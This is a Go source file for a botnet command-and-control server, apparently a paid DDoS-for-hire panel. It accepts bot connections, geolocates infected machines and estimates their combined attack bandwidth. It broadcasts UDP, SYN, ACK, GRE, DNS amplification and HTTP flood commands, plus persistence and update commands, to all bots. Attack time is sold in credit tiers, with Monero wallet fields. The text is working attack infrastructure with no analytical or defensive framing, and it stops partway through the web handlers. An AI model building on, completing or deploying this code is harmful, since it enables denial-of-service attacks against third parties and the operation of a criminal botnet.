package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"html/template"
	"log"
	"math"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"unicode"

	"github.com/golang-jwt/jwt/v5"
	"github.com/google/uuid"
	"github.com/gorilla/sessions"
	"golang.org/x/crypto/bcrypt"
	"golang.org/x/time/rate"
)

const (
	USERS_FILE         = "users.json"
	BOT_SERVER_IP      = "0.0.0.0"
	BOT_SERVER_PORT    = "7002"
	botCleanupInterval = 5 * time.Minute
	heartbeatInterval  = 30 * time.Second
	WEB_SERVER_IP      = "0.0.0.0"
	WEB_SERVER_PORT    = "443"
	CERT_FILE          = "server.crt"
	KEY_FILE           = "server.key"
	SESSION_TIMEOUT    = 30 * time.Minute
	SESSION_NAME       = "scream_session"
	JWT_ISSUER         = "scream-center"
	SSE_ENDPOINT       = "/sse"
	API_USER_DATA      = "/api/user-data"
)

var JWT_SECRET_KEY = generateRandomString(64)

const (
	SESSION_STORE_CLEANUP_INTERVAL = 1 * time.Hour
	MAX_FAILED_ATTEMPTS            = 5
	LOCKOUT_DURATION               = 15 * time.Minute
)

var (
	bots                   []Bot
	botCount               int
	botCountLock           sync.Mutex
	botConns               []*net.Conn
	ongoingAttacks         = make(map[string]Attack)
	store                  *sessions.CookieStore
	botConnLimiter         = rate.NewLimiter(rate.Every(10*time.Second), 1)
	attackStats            = AttackStats{MethodCounts: make(map[string]int), LastReset: time.Now()}
	webRateLimiter         = rate.NewLimiter(rate.Every(time.Second), 5)
	statsLock              sync.Mutex
	JWT_ACCESS_EXPIRATION  = 15 * time.Minute
	JWT_REFRESH_EXPIRATION = 24 * time.Hour
	sseClients             = make(map[chan Metrics]bool)
	sseClientsMu           sync.Mutex
)

type BotManager struct {
	bots  []Bot
	mu    sync.RWMutex
	count int64
}

type TokenPair struct {
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
}

type SessionStore struct {
	sync.RWMutex
}

type AttackManager struct {
	attacks map[string]Attack
	mu      sync.RWMutex
	maxSize int
}

type SessionData struct {
	Username       string
	Level          string
	Authenticated  bool
	ExpiresAt      time.Time
	LastActivity   time.Time
	FailedAttempts int
}

type Metrics struct {
	BotCount             int          `json:"botCount"`
	ActiveAttacks        int          `json:"activeAttacks"`
	Attacks              []AttackInfo `json:"attacks"`
	Bots                 []Bot        `json:"bots"`
	User                 *User        `json:"user,omitempty"`
	MaxConcurrentAttacks int          `json:"maxConcurrentAttacks"`
}

type User struct {
	ID            string        `json:"ID"`
	Username      string        `json:"Username"`
	Password      string        `json:"Password"`
	Expire        time.Time     `json:"Expire"`
	Level         string        `json:"Level"`
	Credits       int           `json:"Credits"`
	WalletAddress string        `json:"WalletAddress"`
	MoneroAddress string        `json:"MoneroAddress"`
	Transactions  []Transaction `json:"Transactions"`
}

type Transaction struct {
	ID          string    `json:"id"`
	Amount      int       `json:"amount"`
	Description string    `json:"description"`
	Time        time.Time `json:"time"`
	Status      string    `json:"status"`
	TxHash      string    `json:"tx_hash"`
}

type Attack struct {
	Method   string        `json:"method"`
	Target   string        `json:"target"`
	Port     string        `json:"port"`
	Duration time.Duration `json:"duration"`
	Start    time.Time     `json:"start"`
}

type Bot struct {
	Arch          string    `json:"arch"`
	Conn          net.Conn  `json:"-"`
	IP            string    `json:"ip"`
	Time          time.Time `json:"time"`
	Country       string    `json:"country"`
	City          string    `json:"city"`
	Region        string    `json:"region"`
	Cores         int       `json:"cores"`
	RAM           float64   `json:"ram"`
	Latitude      float64   `json:"lat"`
	Longitude     float64   `json:"lon"`
	ISP           string    `json:"isp"`
	ASN           string    `json:"asn"`
	LastHeartbeat time.Time `json:"last_heartbeat"`
}

type DashboardData struct {
	User                 User
	BotCount             int
	OngoingAttacks       []AttackInfo
	Bots                 []Bot
	Users                []User
	FlashMessage         string
	BotsJSON             template.JS
	MaxAttackDuration    int
	MaxConcurrentAttacks int
	AvailableMethods     []string
	AttackPower          float64
	AverageCores         float64
	AverageRAM           float64
	TopCountry           string
	TopCity              string
	UniqueCountries      int
	LastHeartbeat        time.Time
	ActiveBotsCount      int
}

type AttackInfo struct {
	Method    string
	Target    string
	Port      string
	Duration  string
	Remaining string
	ID        string
}

type Claims struct {
	Username string `json:"username"`
	Level    string `json:"level"`
	jwt.RegisteredClaims
}

type AttackStats struct {
	TotalAttacksToday int
	MethodCounts      map[string]int
	TotalDuration     time.Duration
	LastReset         time.Time
}

func init() {
	store = sessions.NewCookieStore([]byte(JWT_SECRET_KEY))
	store.Options = &sessions.Options{
		Path:     "/",
		MaxAge:   int(SESSION_TIMEOUT.Seconds()),
		HttpOnly: true,
		Secure:   true,
		SameSite: http.SameSiteStrictMode,
	}
}

func main() {
	if !fileExists(CERT_FILE) || !fileExists(KEY_FILE) {
		generateSelfSignedCert()
	}
	if !fileExists(USERS_FILE) {
		createRootUser()
	}

	go startBotServer()
	go startBotCleanup()
	go broadcastMetrics()
	startWebServer()
}

func generateRandomString(length int) string {
	b := make([]byte, length)
	if _, err := rand.Read(b); err != nil {
		panic(err)
	}
	return base64.URLEncoding.EncodeToString(b)
}

func broadcastMetrics() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		metrics := Metrics{
			BotCount:             getBotCount(),
			ActiveAttacks:        len(ongoingAttacks),
			Attacks:              getOngoingAttacks(),
			Bots:                 getBots(),
			User:                 nil,
			MaxConcurrentAttacks: 1,
		}

		sseClientsMu.Lock()
		for clientChan := range sseClients {
			select {
			case clientChan <- metrics:
			default:
				log.Println("Couldn't send to client, channel blocked")
			}
		}
		sseClientsMu.Unlock()
	}
}

func toJSON(v interface{}) string {
	b, _ := json.Marshal(v)
	return string(b)
}

func fileExists(filename string) bool {
	_, err := os.Stat(filename)
	return err == nil
}

func generateSelfSignedCert() {
	cert := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "localhost"},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().AddDate(1, 0, 0),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}

	priv, _ := rsa.GenerateKey(rand.Reader, 2048)
	certBytes, _ := x509.CreateCertificate(rand.Reader, cert, cert, &priv.PublicKey, priv)

	certOut, _ := os.Create(CERT_FILE)
	pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: certBytes})
	certOut.Close()

	keyOut, _ := os.OpenFile(KEY_FILE, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
	keyOut.Close()
}

func createRootUser() {
	plainPassword := randomString(12)
	hashedPassword, _ := bcrypt.GenerateFromPassword([]byte(plainPassword), bcrypt.DefaultCost)
	rootUser := User{
		ID:            uuid.New().String(),
		Username:      "root",
		Password:      string(hashedPassword),
		Expire:        time.Now().AddDate(1, 0, 0),
		Level:         "Owner",
		Credits:       0,
		WalletAddress: "your-monero-address-here",
		MoneroAddress: "your-monero-address-here",
		Transactions:  []Transaction{},
	}

	bytes, _ := json.MarshalIndent([]User{rootUser}, "", "  ")
	os.WriteFile(USERS_FILE, bytes, 0600)

	fmt.Println("╔════════════════════════════════════════════╗")
	fmt.Println("║          ROOT USER CREDENTIALS             ║")
	fmt.Println("╠════════════════════════════════════════════╣")
	fmt.Printf("║ %-20s: %-25s ║\n", "Username", "root")
	fmt.Printf("║ %-20s: %-25s ║\n", "Password", plainPassword)
	fmt.Println("╚════════════════════════════════════════════╝")
}

func randomString(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
		b[i] = chars[n.Int64()]
	}
	return string(b)
}

func startBotServer() {
	cert, _ := tls.LoadX509KeyPair(CERT_FILE, KEY_FILE)
	listener, _ := tls.Listen("tcp", fmt.Sprintf("%s:%s", BOT_SERVER_IP, BOT_SERVER_PORT), &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	})
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleBotConnection(conn)
	}
}

func handleBotConnection(conn net.Conn) {
	if !botConnLimiter.Allow() {
		conn.Close()
		return
	}

	conn.SetDeadline(time.Now().Add(heartbeatInterval * 2))

	defer func() {
		conn.Close()
		decrementBotCount()
		removeBot(conn)
	}()

	challenge := generateChallenge()
	_, err := fmt.Fprintf(conn, "CHALLENGE:%s\n", challenge)
	if err != nil {
		return
	}

	reader := bufio.NewReader(conn)
	response, err := reader.ReadString('\n')
	if err != nil || strings.TrimSpace(response) != fmt.Sprintf("%x", sha256.Sum256([]byte(challenge+"SALT"))) {
		return
	}

	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
	newBot := Bot{
		Conn:          conn,
		IP:            ip,
		Time:          time.Now(),
		LastHeartbeat: time.Now(),
	}

	country, city, region, lat, lon, _ := getGeoLocation(ip)
	newBot.Country, newBot.City, newBot.Region, newBot.Latitude, newBot.Longitude = country, city, region, lat, lon

	botCountLock.Lock()
	bots = append(bots, newBot)
	botCount = len(bots)
	botConns = append(botConns, &conn)
	botCountLock.Unlock()

	for {
		conn.SetDeadline(time.Now().Add(heartbeatInterval * 2))
		text, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		if strings.HasPrefix(text, "PONG:") || strings.HasPrefix(text, "HEARTBEAT:") {
			parts := strings.Split(text, ":")
			if len(parts) >= 4 {
				updateBotInfo(conn, parts[1], parts[2], newBot.RAM)
			}
			if strings.HasPrefix(text, "HEARTBEAT:") {
				updateBotHeartbeat(conn)
			}
		}
	}
}

func updateBotInfo(conn net.Conn, arch, coresStr string, ram float64) {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	for i, b := range bots {
		if b.Conn == conn {
			bots[i].Arch = arch
			if cores, err := strconv.Atoi(coresStr); err == nil {
				bots[i].Cores = cores
			}
			bots[i].RAM = ram
			break
		}
	}
}

func updateBotHeartbeat(conn net.Conn) {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	for i, b := range bots {
		if b.Conn == conn {
			bots[i].LastHeartbeat = time.Now()
			break
		}
	}
}

func removeBot(conn net.Conn) {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	for i, b := range bots {
		if b.Conn == conn {
			bots = append(bots[:i], bots[i+1:]...)
			break
		}
	}

	for i, botConn := range botConns {
		if *botConn == conn {
			botConns = append(botConns[:i], botConns[i+1:]...)
			break
		}
	}
	botCount = len(bots)
}

func startBotCleanup() {
	ticker := time.NewTicker(botCleanupInterval)
	defer ticker.Stop()

	for range ticker.C {
		cleanupStaleBots()
	}
}

func cleanupStaleBots() {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	threshold := 2 * heartbeatInterval
	var activeBots []Bot

	for _, b := range bots {
		if time.Since(b.LastHeartbeat) <= threshold {
			activeBots = append(activeBots, b)
		} else if b.Conn != nil {
			b.Conn.Close()
		}
	}

	bots = activeBots
	botCount = len(bots)
}

func generateChallenge() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func getGeoLocation(ip string) (string, string, string, float64, float64, error) {
	if ip == "127.0.0.1" || ip == "::1" || ip == "localhost" {
		return "Local", "Local Network", "Internal", 0, 0, nil
	}

	host, _, _ := net.SplitHostPort(ip)
	ip = host

	resp, err := http.Get(fmt.Sprintf("http://www.geoplugin.net/json.gp?ip=%s", ip))
	if err != nil {
		return "", "", "", 0, 0, err
	}
	defer resp.Body.Close()

	var data struct {
		Country   string  `json:"geoplugin_countryName"`
		City      string  `json:"geoplugin_city"`
		Region    string  `json:"geoplugin_regionName"`
		Latitude  float64 `json:"geoplugin_latitude,string"`
		Longitude float64 `json:"geoplugin_longitude,string"`
		Error     bool    `json:"error"`
	}

	json.NewDecoder(resp.Body).Decode(&data)
	if data.Error {
		return "", "", "", 0, 0, nil
	}

	return data.Country, data.City, data.Region, data.Latitude, data.Longitude, nil
}

func isValidPort(portStr string) bool {
	port, err := strconv.Atoi(portStr)
	return err == nil && port > 0 && port <= 65535
}

func isValidMethod(method string) bool {
	validMethods := map[string]bool{
		"!udpflood": true, "!udpsmart": true, "!tcpflood": true,
		"!synflood": true, "!ackflood": true, "!greflood": true,
		"!dns": true, "!http": true,
	}
	return validMethods[method]
}

func sendToBots(command string) error {
	if !isValidCommand(command) {
		return fmt.Errorf("invalid command format")
	}

	botCountLock.Lock()
	defer botCountLock.Unlock()

	var lastErr error
	sentCount := 0

	for _, bot := range bots {
		if bot.Conn != nil {
			bot.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			_, err := fmt.Fprintf(bot.Conn, "%s\n", command)
			if err != nil {
				lastErr = err
				continue
			}
			sentCount++
		}
	}

	if sentCount == 0 {
		return fmt.Errorf("no active bots available")
	}
	return lastErr
}

func isValidCommand(cmd string) bool {
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return false
	}

	validCommands := map[string]bool{
		"!udpflood": true, "!udpsmart": true, "!tcpflood": true,
		"!synflood": true, "!ackflood": true, "!greflood": true,
		"!dns": true, "!http": true, "STOP": true, "PING": true,
		"kill": true, "update": true, "lock": true, "persist": true,
	}

	if !validCommands[parts[0]] {
		return false
	}

	if strings.HasPrefix(parts[0], "!") && len(parts) < 4 {
		return false
	}

	return true
}

func decrementBotCount() {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	if botCount > 0 {
		botCount--
	}
}

func updateAttackStats(method string, duration time.Duration) {
	statsLock.Lock()
	defer statsLock.Unlock()

	if time.Since(attackStats.LastReset) >= 24*time.Hour {
		attackStats = AttackStats{MethodCounts: make(map[string]int), LastReset: time.Now()}
	}

	attackStats.TotalAttacksToday++
	attackStats.MethodCounts[method]++
	attackStats.TotalDuration += duration
}

func strictValidateIP(ip string) bool {
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return false
	}

	if parsed.IsPrivate() || parsed.IsLoopback() ||
		parsed.IsMulticast() || parsed.IsUnspecified() {
		return false
	}

	if strings.Contains(ip, ".") {
		matched, _ := regexp.MatchString(`^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$`, ip)
		return matched
	}

	return true
}

func strictValidateHostname(host string) bool {
	if len(host) > 253 {
		return false
	}

	labels := strings.Split(host, ".")
	for _, label := range labels {
		if len(label) < 1 || len(label) > 63 {
			return false
		}

		if !regexp.MustCompile(`^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?$`).MatchString(label) {
			return false
		}
	}

	if len(labels) > 0 {
		tld := labels[len(labels)-1]
		if !regexp.MustCompile(`^[a-zA-Z]{2,}$`).MatchString(tld) {
			return false
		}
	}

	return true
}

func GetSession(r *http.Request) (*sessions.Session, error) {
	if store == nil {
		return nil, fmt.Errorf("session store not initialized")
	}
	return store.Get(r, SESSION_NAME)
}

func validateJWT(tokenString string) (*Claims, error) {
	claims := &Claims{}
	token, err := jwt.ParseWithClaims(tokenString, claims, func(token *jwt.Token) (interface{}, error) {
		if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
			return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
		}
		return []byte(JWT_SECRET_KEY), nil
	})

	if err != nil || !token.Valid {
		return nil, fmt.Errorf("invalid token")
	}
	return claims, nil
}

func validatePassword(password string) error {
	if len(password) < 12 {
		return fmt.Errorf("password must be at least 12 characters")
	}

	var hasUpper, hasLower, hasDigit, hasSpecial bool
	for _, c := range password {
		switch {
		case unicode.IsUpper(c):
			hasUpper = true
		case unicode.IsLower(c):
			hasLower = true
		case unicode.IsDigit(c):
			hasDigit = true
		case unicode.IsPunct(c) || unicode.IsSymbol(c):
			hasSpecial = true
		}
	}

	if !hasUpper || !hasLower || !hasDigit || !hasSpecial {
		return fmt.Errorf("password must contain uppercase, lowercase, digit and special characters")
	}

	commonPasswords := []string{"password", "123456", "qwerty", "letmein"}
	lowerPass := strings.ToLower(password)
	for _, common := range commonPasswords {
		if strings.Contains(lowerPass, common) {
			return fmt.Errorf("password is too common or weak")
		}
	}

	return nil
}

func getUniqueCountries(bots []Bot) int {
	countries := make(map[string]bool)
	for _, b := range bots {
		if b.Country != "" {
			countries[b.Country] = true
		}
	}
	return len(countries)
}

func getAverageCores(bots []Bot) float64 {
	totalCores, activeCount := 0, 0
	threshold := 2 * heartbeatInterval

	for _, bot := range bots {
		if time.Since(bot.LastHeartbeat) <= threshold {
			totalCores += bot.Cores
			activeCount++
		}
	}

	if activeCount == 0 {
		return 0.0
	}
	return float64(totalCores) / float64(activeCount)
}

func getAverageRAM(bots []Bot) float64 {
	totalRAM, activeCount := 0.0, 0
	threshold := 2 * heartbeatInterval

	for _, bot := range bots {
		if time.Since(bot.LastHeartbeat) <= threshold {
			totalRAM += bot.RAM
			activeCount++
		}
	}

	if activeCount == 0 {
		return 0.0
	}
	return totalRAM / float64(activeCount)
}

func getTopCountry(bots []Bot) string {
	countryCount := make(map[string]int)
	threshold := 2 * heartbeatInterval
	maxCount := 0
	topCountry := "N/A"

	for _, bot := range bots {
		if time.Since(bot.LastHeartbeat) <= threshold {
			country := bot.Country
			if country == "" {
				country = "Unknown"
			}
			countryCount[country]++

			if countryCount[country] > maxCount {
				maxCount = countryCount[country]
				topCountry = country
			}
		}
	}
	return topCountry
}

func getTopCity(bots []Bot) string {
	cityCount := make(map[string]int)
	threshold := 2 * heartbeatInterval
	maxCount := 0
	topCity := "N/A"

	for _, bot := range bots {
		if time.Since(bot.LastHeartbeat) <= threshold {
			city := bot.City
			if city == "" {
				city = "Unknown"
			}

			locationKey := fmt.Sprintf("%s, %s", city, bot.Region)
			if bot.Country != "" {
				locationKey = fmt.Sprintf("%s (%s)", locationKey, bot.Country)
			}

			cityCount[locationKey]++
			if cityCount[locationKey] > maxCount {
				maxCount = cityCount[locationKey]
				topCity = locationKey
			}
		}
	}
	return topCity
}

func getLastHeartbeat(bots []Bot) time.Time {
	threshold := 2 * heartbeatInterval
	var latestHeartbeat time.Time

	for _, bot := range bots {
		if time.Since(bot.LastHeartbeat) <= threshold {
			if bot.LastHeartbeat.After(latestHeartbeat) || latestHeartbeat.IsZero() {
				latestHeartbeat = bot.LastHeartbeat
			}
		}
	}
	return latestHeartbeat
}

func getActiveBotsCount(bots []Bot) int {
	count := 0
	threshold := 2 * heartbeatInterval

	for _, bot := range bots {
		if time.Since(bot.LastHeartbeat) <= threshold {
			count++
		}
	}
	return count
}

func getAttackPower(bots []Bot) float64 {
	totalPower := 0.0

	for _, bot := range bots {
		if time.Since(bot.LastHeartbeat) <= 2*heartbeatInterval {
			botPower := 0.0
			networkCapacity := float64(bot.Cores) * 70.0
			ramFactor := 1.0 + (bot.RAM / 16.0)
			archFactor := 1.0
			if strings.Contains(strings.ToLower(bot.Arch), "x86_64") {
				archFactor = 1.2
			} else if strings.Contains(strings.ToLower(bot.Arch), "arm") {
				archFactor = 0.7
			}

			connectionFactor := 1.0
			if strings.Contains(strings.ToLower(bot.ISP), "fiber") {
				connectionFactor = 1.5
			} else if strings.Contains(strings.ToLower(bot.ISP), "cable") {
				connectionFactor = 1.2
			}

			botPower = networkCapacity * ramFactor * archFactor * connectionFactor
			totalPower += botPower
		}
	}

	totalGbps := totalPower / 1000
	return math.Round(totalGbps*100) / 100
}

func rateLimitMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if !webRateLimiter.Allow() {
			http.Error(w, "Rate limit exceeded", http.StatusTooManyRequests)
			return
		}
		next.ServeHTTP(w, r)
	})
}

func isValidIP(ipStr string) bool {
	ip := net.ParseIP(ipStr)
	if ip != nil {
		if isPrivateIP(ip) {
			return !isPrivateIP(ip)
		}
		return true
	}

	if _, err := net.ResolveIPAddr("ip6", ipStr); err == nil {
		return true
	}

	if _, err := net.LookupHost(ipStr); err == nil {
		return true
	}

	return false
}

func isPrivateIP(ip net.IP) bool {
	privateBlocks := []*net.IPNet{
		{IP: net.ParseIP("10.0.0.0"), Mask: net.CIDRMask(8, 32)},
		{IP: net.ParseIP("172.16.0.0"), Mask: net.CIDRMask(12, 32)},
		{IP: net.ParseIP("192.168.0.0"), Mask: net.CIDRMask(16, 32)},
		{IP: net.ParseIP("127.0.0.0"), Mask: net.CIDRMask(8, 32)},
		{IP: net.ParseIP("169.254.0.0"), Mask: net.CIDRMask(16, 32)},
		{IP: net.ParseIP("::1"), Mask: net.CIDRMask(128, 128)},
		{IP: net.ParseIP("fc00::"), Mask: net.CIDRMask(7, 128)},
		{IP: net.ParseIP("fe80::"), Mask: net.CIDRMask(10, 128)},
		{IP: net.ParseIP("224.0.0.0"), Mask: net.CIDRMask(4, 32)},
		{IP: net.ParseIP("240.0.0.0"), Mask: net.CIDRMask(4, 32)},
	}

	for _, block := range privateBlocks {
		if block.Contains(ip) {
			return true
		}
	}
	return false
}

func CalculateAttackCost(method string, duration int, userLevel string) int {
	if userLevel == "Owner" || userLevel == "Admin" {
		return 0
	}

	methodCost := map[string]int{
		"!udpflood": 1,
		"!udpsmart": 2,
		"!tcpflood": 2,
		"!synflood": 3,
		"!ackflood": 3,
		"!greflood": 4,
		"!dns":      5,
		"!http":     5,
	}

	costPerSecond, exists := methodCost[method]
	if !exists {
		return 0
	}

	totalCost := costPerSecond * duration
	if totalCost < 1 {
		totalCost = 1
	}

	return totalCost
}

func GetMaxAttackDuration(userLevel string) int {
	switch userLevel {
	case "Owner", "Admin":
		return 9999
	case "Pro":
		return 300
	case "Basic":
		return 120
	default:
		return 60
	}
}

func GetMaxConcurrentAttacks(userLevel string) int {
	switch userLevel {
	case "Owner":
		return 5
	case "Admin":
		return 5
	case "Pro":
		return 3
	case "Basic":
		return 1
	default:
		return 1
	}
}

func FormatAttackMethodName(method string) string {
	names := map[string]string{
		"!udpflood": "UDP Flood",
		"!udpsmart": "UDP Smart",
		"!tcpflood": "TCP Flood",
		"!synflood": "SYN Flood",
		"!ackflood": "ACK Flood",
		"!greflood": "GRE Flood",
		"!dns":      "DNS Amplification",
		"!http":     "HTTP Flood",
	}
	return names[method]
}

func GetAvailableMethods(userLevel string) []string {
	allMethods := []string{
		"!udpflood",
		"!udpsmart",
		"!tcpflood",
		"!synflood",
		"!ackflood",
		"!greflood",
		"!dns",
		"!http",
	}

	if userLevel == "Owner" || userLevel == "Admin" || userLevel == "Pro" {
		return allMethods
	}

	return allMethods[:4]
}

func FormatDurationHumanReadable(seconds int) string {
	minutes := seconds / 60
	hours := minutes / 60
	days := hours / 24

	if days > 0 {
		return fmt.Sprintf("%dd %dh", days, hours%24)
	}
	if hours > 0 {
		return fmt.Sprintf("%dh %dm", hours, minutes%60)
	}
	if minutes > 0 {
		return fmt.Sprintf("%dm %ds", minutes, seconds%60)
	}
	return fmt.Sprintf("%ds", seconds)
}

func startWebServer() {
	funcMap := template.FuncMap{
		"FormatCredits": func(credits int) string {
			if credits < 0 {
				return "∞"
			}
			return fmt.Sprintf("%d", credits)
		},
		"isActive": func(lastHeartbeat time.Time) bool {
			return time.Since(lastHeartbeat) <= 2*heartbeatInterval
		},
		"CalculateAttackCost":         CalculateAttackCost,
		"GetMaxAttackDuration":        GetMaxAttackDuration,
		"GetMaxConcurrentAttacks":     GetMaxConcurrentAttacks,
		"FormatAttackMethodName":      FormatAttackMethodName,
		"FormatDurationHumanReadable": FormatDurationHumanReadable,
		"FormatMethodIcon": func(method string) template.HTML {
			icons := map[string]string{
				"!udpflood": "fa-bolt",
				"!udpsmart": "fa-brain",
				"!tcpflood": "fa-network-wired",
				"!synflood": "fa-sync",
				"!ackflood": "fa-reply",
				"!greflood": "fa-project-diagram",
				"!dns":      "fa-server",
				"!http":     "fa-globe",
			}
			if icon, ok := icons[method]; ok {
				return template.HTML(fmt.Sprintf(`<i class="fas %s"></i>`, icon))
			}
			return template.HTML(`<i class="fas fa-question"></i>`)
		},
		"IsBotActive": func(lastHeartbeat time.Time) bool {
			return time.Since(lastHeartbeat) <= 2*heartbeatInterval
		},
		"ValidateTarget":      strictValidateIP,
		"CalculateCreditCost": func(credits int) float64 { return float64(credits) / 1000.0 },
		"FormatDateTime":      func(t time.Time) string { return t.Format("2006-01-02 15:04:05") },
		"getLastHeartbeat":    getLastHeartbeat,
		"getTopCity":          getTopCity,
		"getTopCountry":       getTopCountry,
		"getAverageRAM":       getAverageRAM,
		"getAverageCores":     getAverageCores,
		"getActiveBotsCount":  getActiveBotsCount,
		"div": func(a, b uint64) float64 {
			if b == 0 {
				return 0
			}
			return float64(a) / float64(b)
		},
		"now":                func() time.Time { return time.Now() },
		"sub":                func(a, b uint64) uint64 { return a - b },
		"formatGB":           func(bytes uint64) float64 { return float64(bytes) / 1073741824.0 },
		"getUniqueCountries": getUniqueCountries,
		"getAttackPower":     getAttackPower,
	}

	tmpl, err := template.New("").Funcs(funcMap).ParseGlob("templates/*.html")
	if err != nil {
		log.Fatal("Template parsing error:", err)
	}

	addSecurityHeaders := func(next http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Security-Policy",
				"default-src 'self'; "+
					"script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com https://cdn.jsdelivr.net https://unpkg.com; "+
					"style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com https://fonts.googleapis.com; "+
					"img-src 'self' data: https://*.tile.openstreetmap.org; "+
					"font-src 'self' https://cdnjs.cloudflare.com https://fonts.gstatic.com; "+
					"connect-src 'self'; "+
					"frame-ancestors 'none'; "+
					"form-action 'self'")
			w.Header().Set("X-Content-Type-Options", "nosniff")
			w.Header().Set("X-Frame-Options", "DENY")
			w.Header().Set("X-XSS-Protection", "1; mode=block")
			w.Header().Set("Referrer-Policy", "no-referrer")
			w.Header().Set("Permissions-Policy", "geolocation=(), microphone=(), camera=()")
			w.Header().Set("Strict-Transport-Security", "max-age=63072000; includeSubDomains; preload")

			next(w, r)
		}
	}

	server := &http.Server{
		Addr: fmt.Sprintf("%s:%s", WEB_SERVER_IP, WEB_SERVER_PORT),
		TLSConfig: &tls.Config{
			MinVersion:               tls.VersionTLS13,
			PreferServerCipherSuites: true,
			CurvePreferences:         []tls.CurveID{tls.X25519, tls.CurveP256},
		},
	}

	http.HandleFunc(SSE_ENDPOINT, addSecurityHeaders(requireAuth(handleSSE)))
	http.Handle(API_USER_DATA, addSecurityHeaders(requireAuth(handleUserData)))

	http.HandleFunc("/", addSecurityHeaders(func(w http.ResponseWriter, r *http.Request) {
		if accessCookie, err := r.Cookie("access_token"); err == nil {
			if _, err := validateJWT(accessCookie.Value); err == nil {
				http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
				return
			}
		}
		tmpl.ExecuteTemplate(w, "login.html", nil)
	}))

	http.Handle("/login", rateLimitMiddleware(addSecurityHeaders(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}

		username := r.FormValue("username")
		password := r.FormValue("password")

		if exists, user := authUser(username, password); exists {
			session, err := GetSession(r)
			if err != nil {
				log.Printf("Session error: %v", err)
				http.Error(w, "Internal server error", http.StatusInternalServerError)
				return
			}

			session.Values["authenticated"] = true
			session.Values["username"] = user.Username
			session.Values["level"] = user.Level
			session.Values["user_id"] = user.ID

			if err := session.Save(r, w); err != nil {
				log.Printf("Session save error: %v", err)
				http.Error(w, "Internal server error", http.StatusInternalServerError)
				return
			}

			tokens, err := generateTokenPair(*user)
			if err != nil {
				tmpl.ExecuteTemplate(w, "login.html", struct{ Error string }{"Internal server error"})
				return
			}

			http.SetCookie(w, &http.Cookie{
				Name:     "access_token",
				Value:    tokens.AccessToken,
				Path:     "/",
				Secure:   true,
				HttpOnly: true,
				MaxAge:   int(JWT_ACCESS_EXPIRATION.Seconds()),
				SameSite: http.SameSiteStrictMode,
			})

			http.SetCookie(w, &http.Cookie{
				Name:     "refresh_token",
				Value:    tokens.RefreshToken,
				Path:     "/",
				Secure:   true,
				HttpOnly: true,
				MaxAge:   int(JWT_REFRESH_EXPIRATION.Seconds()),
				SameSite: http.SameSiteStrictMode,
			})

			http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		} else {
			tmpl.ExecuteTemplate(w, "login.html", struct{ Error string }{"Invalid username or password"})
		}
	})))

	http.HandleFunc("/refresh-token", addSecurityHeaders(func(w http.ResponseWriter, r *http.Request) {
		refreshCookie, err := r.Cookie("refresh_token")
		if err != nil {
			http.Error(w, "Refresh token required", http.StatusBadRequest)
			return
		}

		claims, err := validateJWT(refreshCookie.Value)
		if err != nil {
			http.Error(w, "Invalid refresh token", http.StatusUnauthorized)
			return
		}

		users := getUsers()
		var user *User
		for _, u := range users {
			if u.Username == claims.Username {
				user = &u
				break
			}
		}

		if user == nil {
			http.Error(w, "User not found", http.StatusUnauthorized)
			return
		}

		tokens, err := generateTokenPair(*user)
		if err != nil {
			http.Error(w, "Failed to generate tokens", http.StatusInternalServerError)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(tokens)
	}))

